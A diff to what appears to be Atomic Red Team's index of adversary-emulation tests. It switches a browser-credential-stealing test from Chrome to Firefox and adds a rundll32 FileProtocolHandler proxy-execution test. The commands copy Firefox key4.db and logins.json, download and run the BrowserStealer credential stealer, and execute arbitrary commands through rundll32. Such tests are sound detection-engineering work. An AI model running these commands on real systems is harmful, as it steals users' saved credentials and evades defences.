@@ -13320,7 +13320,7 @@ input_arguments.executable_path.type: path
 
 input_arguments.executable_path.default: /System/Applications/Calculator.app/Contents/MacOS/Calculator
 
-input_arguments.label_name.description: Path of the executable to run.
+input_arguments.label_name.description: Unique label to assign this job to launchd.
 
 input_arguments.label_name.type: string
 
@@ -15921,24 +15921,30 @@ input_arguments.webbrowserpassview_path.default: PathToAtomicsFolder\T1555.003\b
 "
 T1555.003,Credentials from Password Stores: Credentials from Web Browsers,BrowserStealer (Chrome / Firefox / Microsoft Edge),6f2c5c87-a4d5-4898-9bd1-47a55ecaf1dd,"[Github Repo](https://github.com/SaulBerrenson/BrowserStealer) Simple password/cookies stealer for chrome, edge, and gecko based browsers (30 listed working). This attack simulates stealing the data from the browser files and printing them to the command line.
 If using to test with Firefox, if the browser is x64 you need to use the x64 build
-",windows,,,"Copy-Item ""$env:localappdata\Google\Chrome\User Data\Default\Login Data"" -Destination ""PathToAtomicsFolder\..\ExternalPayloads"" > $null
-Remove-Item ""$env:localappdata\Google\Chrome\User Data\Default\Login Data"" > $null
-Copy-Item ""$env:PathToAtomicsFolder\T1555.003\src\Login Data"" -Destination ""$env:localappdata\Google\Chrome\User Data\Default\"" > $null
+",windows,,,"$profile = (Gci -filter ""*default-release*"" -path $env:Appdata\Mozilla\Firefox\Profiles\).FullName
+Copy-Item $profile\key4.db -Destination ""PathToAtomicsFolder\..\ExternalPayloads"" > $null
+Copy-Item $profile\logins.json -Destination ""PathToAtomicsFolder\..\ExternalPayloads"" > $null
+Remove-Item $profile\key4.db > $null
+Remove-Item $profile\logins.json > $null
+Copy-Item ""$env:PathToAtomicsFolder\T1555.003\src\key4.db"" -Destination $profile\ > $null
+Copy-Item ""$env:PathToAtomicsFolder\T1555.003\src\logins.json"" -Destination $profile\ > $null
 cd ""$env:PathToAtomicsFolder\T1555.003\bin""
-.\BrowserCollector.exe
-",powershell,,,"Remove-Item ""$env:localappdata\Google\Chrome\User Data\Default\Login Data"" > $null
-Copy-Item ""PathToAtomicsFolder\..\ExternalPayloads"" -Destination ""$env:localappdata\Google\Chrome\User Data\Default\Login Data"" > $null
-Remove-Item ""PathToAtomicsFolder\..\ExternalPayloads\Login Data"" > $null
-",powershell,"dependencies.0.description: Google Chrome must be on the device.
+""""|.\BrowserCollector.exe
+",powershell,,,"$profile = (Gci -filter ""*default-release*"" -path $env:Appdata\Mozilla\Firefox\Profiles\).FullName
+Remove-Item $profile\key4.db > $null
+Remove-Item $profile\logins.json > $null
+Copy-Item ""PathToAtomicsFolder\..\ExternalPayloads"" -Destination $profile\ > $null
+Remove-Item ""PathToAtomicsFolder\..\ExternalPayloads\key4.db"" > $null
+Remove-Item ""PathToAtomicsFolder\..\ExternalPayloads\logins.json"" > $null
+",powershell,"dependencies.0.description: Firefox must be on the device.
 
-dependencies.0.prereq_command: if ((Test-Path ""C:\Program Files\Google\Chrome\Application\chrome.exe"") -Or (Test-Path ""C:\Program Files (x86)\Google\Chrome\Application\chrome.exe"")) {exit 0} else {exit 1}
+dependencies.0.prereq_command: if ((Test-Path ""C:\Program Files\Mozilla Firefox\firefox.exe"") -Or (Test-Path ""C:\Program Files (x86)\Mozilla Firefox\firefox.exe"")) {exit 0} else {exit 1}
 
 dependencies.0.get_prereq_command: New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction Ignore -Force | Out-Null
-$installer = ""PathToAtomicsFolder\..\ExternalPayloads\ChromeStandaloneSetup64.msi""
-Invoke-WebRequest -OutFile ""PathToAtomicsFolder\..\ExternalPayloads\ChromeStandaloneSetup64.msi"" https://dl.google.com/chrome/install/googlechromestandaloneenterprise64.msi
-msiexec /i $installer /qn
-Start-Process -FilePath ""chrome.exe""
-Stop-Process -Name ""chrome""
+$installer = ""PathToAtomicsFolder\..\ExternalPayloads\FirefoxStubInstaller.exe""
+Invoke-WebRequest -OutFile $installer ""https://download.mozilla.org/?product=firefox-stub&os=win&lang=en-US""
+Start-Process -FilePath $installer -Wait
+Stop-Process -Name ""firefox""
 
 dependencies.1.description: BrowserCollector must exist in the bin directory
 
@@ -15946,10 +15952,11 @@ dependencies.1.prereq_command: if (Test-Path ""PathToAtomicsFolder\T1555.003\bin
 
 dependencies.1.get_prereq_command: New-Item -Type Directory ""PathToAtomicsFolder\T1555.003\bin\"" -ErrorAction Ignore -Force | Out-Null
 Invoke-WebRequest ""https://github.com/SaulBerrenson/BrowserStealer/releases/download/1.0.0.4/BrowserCollector_x64.exe"" -Outfile: ""PathToAtomicsFolder\T1555.003\bin\BrowserCollector.exe""
-dependencies.2.description: Login Data file that is a copy of a chrome Login Data that contains credentials for the tool to ""steal."" Must exist at the specified path.
+dependencies.2.description: Login Data file that is a copy of a Firefox Login Data that contains credentials for the tool to ""steal."" Must exist at the specified path.
 
-dependencies.2.prereq_command: if (Test-Path ""PathToAtomicsFolder\T1555.003\src\Login Data"") {exit 0} else {exit 1}
-dependencies.2.get_prereq_command: Invoke-WebRequest ""https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1555.003/src/Login%20Data?raw=true"" -Outfile: ""PathToAtomicsFolder\T1555.003\src\Login Data""
+dependencies.2.prereq_command: if (Test-Path ""PathToAtomicsFolder\T1555.003\src\key4.db"") {exit 0} else {exit 1}
+dependencies.2.get_prereq_command: Invoke-WebRequest ""https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1555.003/src/key4.db?raw=true"" -Outfile: ""PathToAtomicsFolder\T1555.003\src\key4.db""
+Invoke-WebRequest ""https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1555.003/src/logins.json?raw=true"" -Outfile: ""PathToAtomicsFolder\T1555.003\src\logins.json"" 
 ",
 T1555.003,Credentials from Password Stores: Credentials from Web Browsers,Dump Chrome Login Data with esentutl,70422253-8198-4019-b617-6be401b49fce,"This test simulates an adversary using esentutl to dump encrypted credentials from Google Chrome's Login database.
 [Reference](https://actzero.ai/resources/blog/hygiene-tip-shut-down-attackers-harvesting-cached-browser-credentials/)
@@ -20551,6 +20558,17 @@ input_arguments.dll_url.description: The URL to the DLL file that must be downlo
 input_arguments.dll_url.type: url
 
 input_arguments.dll_url.default: https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.011/bin/_WT.init
+
+"
+T1218.011,Signed Binary Proxy Execution: Rundll32,Rundll32 execute command via FileProtocolHandler,f3ad3c5b-1db1-45c1-81bf-d3370ebab6c8,"Test execution of a command using rundll32.exe and the FileProtocolHandler technique.
+Upon execution, calc.exe will be launched.
+This technique is documented by Levan Abesadze - https://medium.com/@Wolverineisstillalive/system-binary-proxy-execution-rundll32-bypass-method-790871e1f2b7
+",windows,,,"rundll32.exe url.dll,FileProtocolHandler #{command_to_execute}
+",command_prompt,,,,,,"input_arguments.command_to_execute.description: Command for rundll32.exe to execute
+
+input_arguments.command_to_execute.type: string
+
+input_arguments.command_to_execute.default: calc.exe
 
 "
 T1027,Obfuscated Files or Information,Decode base64 Data into Script,f45df6be-2e1e-4136-a384-8f18ab3826fb,"Creates a base64-encoded data file and decodes it into an executable shell script
